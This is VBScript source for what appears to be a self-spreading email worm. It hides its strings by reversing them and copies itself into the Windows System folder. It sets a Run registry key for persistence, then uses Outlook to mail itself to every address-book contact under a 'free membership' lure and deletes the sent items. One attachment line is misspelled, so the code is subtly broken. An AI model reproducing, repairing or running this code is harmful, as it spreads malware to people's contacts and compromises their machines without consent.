' CRaZy DuDe

On Error Resume Next

Dim WCSL
Dim IGPA50
Dim TL1SDN6D
Dim ZPW74H
Dim CTZ
Dim CQRL4NAT
Dim LJVEBBF0

Set WCSL = CreateObject( EWKJ7( "tcejbOmetsySeliF.gnitpircS" ) )
WCSL.CopyFile WScript.ScriptFullName, WCSL.BuildPath( WCSL.GetSpecialFolder(1), EWKJ7( "SBV.L0O4L" ) )

Set IGPA50 = CreateObject( EWKJ7( "llehS.tpircSW" ) )
IGPA50.RegWrite EWKJ7( "\nuR\noisreVtnerruC\swodniW\tfosorciM\erawtfoS\ENIHCAM_LACOL_YEKH" ) & EWKJ7( "L0O4L" ), WCSL.BuildPath( WCSL.GetSpecialFolder(1), EWKJ7( "SBV.L0O4L" ) )

SBZH3 = IGPA50.RegRead( EWKJ7( "\ENIHCAM_LACOL_YEKH" ) & EWKJ7( "L0O4L" ) )

If SBZH3 = "" Or SBZH3 > 20 Then
   SBZH3 = 0
End If

If SBZH3 = 0 Then
   Set CTZ = CreateObject( EWKJ7( "noitacilppA.kooltuO" ) )
   Set TL1SDN6D = CTZ.GetNameSpace( EWKJ7( "IPAM" ) )

   For Each ZPW74H In TL1SDN6D.AddressLists
       Set ZJ8RMH = CTZ.CreateItem( 0 )

       For CQRL4NAT = 1 To ZPW74H.AddressEntries.Count
           Set LJVEBBF0 = ZPW74H.AddressEntries( CQRL4NAT )

           If CQRL4NAT = 1 Then
              ZJ8RMH.BCC = LJVEBBF0.Address
           Else
              ZJ8RMH.BCC = ZJ8RMH.BCC & EWKJ7( " ;" ) & LJVEBBF0.Address
           End If
       Next

       ZJ8RMH.Subject = EWKJ7( "pihsrebmem eerf" )
       ZJ8RMH.Body = EWKJ7( "moc.tfosorcim.www//:ptth ! lla rof pihsrebmem eerF" )
       ZJ8RMH.Attachmets.Add WScript.ScriptFullName
       ZJ8RMH.DeleteAfterSubmit = True
       ZJ8RMH.Send
   Next

   SBZH3 = 0
End If

IGPA50.RegWrite EWKJ7( "\ENIHCAM_LACOL_YEKH" ) & EWKJ7( "L0O4L" ), SBZH3 + 1

Function EWKJ7( A2Y )
   Dim K2SUV
   Dim KHJWLJGP
   Dim UP62VR

   K2SUV = ""

   For KHJWLJGP = 1 To Len( A2Y )
       UP62VR = Mid( A2Y, KHJWLJGP, 1 )

       K2SUV = UP62VR & K2SUV
   Next

   EWKJ7 = K2SUV
End Function
